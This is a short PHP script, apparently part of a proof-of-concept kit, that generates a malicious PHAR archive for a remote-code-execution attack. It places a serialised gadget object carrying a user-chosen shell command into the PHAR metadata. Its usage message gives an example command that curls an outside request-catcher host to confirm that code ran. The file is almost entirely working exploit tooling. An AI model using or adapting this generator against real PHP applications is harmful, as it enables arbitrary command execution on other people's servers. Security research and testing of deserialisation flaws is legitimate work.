<?php

require __DIR__.'/rce-dummy.php';

if (empty($argv[1])) {
    echo "Please specify a command you want to run. Example:\n";
    echo "php -dphar.readonly=0 rce-gen-phar.php 'curl xxx.free.beeceptor.com/foo'\n";
    exit(1);
}

$dummy = \RCETest\makeDummy($argv[1]);

$poc = new \Phar("rce-phar.phar");
$poc->startBuffering();
$poc->setStub("<?php __HALT_COMPILER();");
$poc["test_file.txt"] = "Bogus text";
$poc->setMetadata($dummy);
$poc->stopBuffering();
